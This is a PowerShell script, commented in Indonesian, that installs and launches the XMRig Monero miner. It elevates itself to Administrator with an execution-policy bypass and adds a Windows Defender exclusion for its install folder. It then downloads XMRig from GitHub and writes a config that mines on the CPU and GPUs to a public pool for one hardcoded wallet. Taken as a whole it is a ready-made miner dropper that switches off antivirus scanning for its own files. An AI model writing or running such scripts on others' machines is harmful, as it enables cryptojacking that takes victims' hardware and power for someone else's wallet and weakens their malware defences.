# ==============================================================================
# AUTOMATED XMRIG SETUP & LAUNCHER (PowerShell - SupportXMR Config)
# ==============================================================================

# 1. MINTA HAK AKSES ADMINISTRATOR
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] Meminta akses Administrator..." -ForegroundColor Yellow
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# 2. VARIABEL KONFIGURASI
$installDir = "C:\xmrig"
$xmrigUrl   = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"

Write-Host "=== PERSIAPAN MINING XMRIG (SupportXMR) ===" -ForegroundColor Green

# 3. BUAT DIREKTORI DAN KECUALIKAN DARI WINDOWS DEFENDER
if (-not (Test-Path -Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir | Out-Null
    Write-Host "[+] Folder $installDir berhasil dibuat." -ForegroundColor Cyan
}

Write-Host "[+] Menambahkan pengecualian Windows Defender..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue

# 4. UNDUH DAN EKSTRAK XMRIG
$xmrigZip = "$env:TEMP\xmrig.zip"
Write-Host "[+] Mendownload XMRig..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip

Write-Host "[+] Mengekstrak XMRig..." -ForegroundColor Cyan
Expand-Archive -Path $xmrigZip -DestinationPath "$env:TEMP\xmrig_extracted" -Force
Get-ChildItem -Path "$env:TEMP\xmrig_extracted\*" -Recurse | Move-Item -Destination $installDir -Force
Remove-Item -Path $xmrigZip, "$env:TEMP\xmrig_extracted" -Recurse -Force

# 5. BUAT FILE CONFIG.JSON (Tulis dalam UTF-8 tanpa BOM agar tidak corrupt)
Write-Host "[+] Membuat file config.json..." -ForegroundColor Cyan
$configJson = @"
{
    "autosave": true,
    "cpu": true,
    "opencl": true,
    "cuda": true,
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "48Cdv8BajGJJrgA4aFnQU64sugzQWzqKwLMMuKdjZdFvNAXF3P2WabWKjsfV3YMsb4BAaDDn5dYzea7HuyQ9RDvhAZQnNCx",
            "pass": "guthib",
            "keepalive": true,
            "tls": true
        }
    ]
}
"@

$utf8NoBom = New-Object System.Text.UTF8Encoding $false
[System.IO.File]::WriteAllText("$installDir\config.json", $configJson, $utf8NoBom)

# 6. JALANKAN XMRIG
Write-Host "[+] Persiapan Selesai! Memulai XMRig..." -ForegroundColor Green
Set-Location -Path $installDir
Start-Process -FilePath "$installDir\xmrig.exe" -WorkingDirectory $installDir
